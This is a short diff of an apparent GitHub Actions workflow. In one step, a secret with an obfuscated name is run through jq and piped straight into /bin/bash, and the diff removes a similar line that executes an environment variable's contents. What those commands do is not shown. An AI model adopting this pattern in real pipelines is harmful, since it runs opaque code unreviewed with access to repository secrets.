@@ -17,7 +17,6 @@ jobs:
           urdb07: ${{ secrets.urdb07 }}
         run: |
           printf '%s' "$urdb07" | jq -r .yws9 | /bin/bash
-          echo $rxzd36998 | jq -r .yg02 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
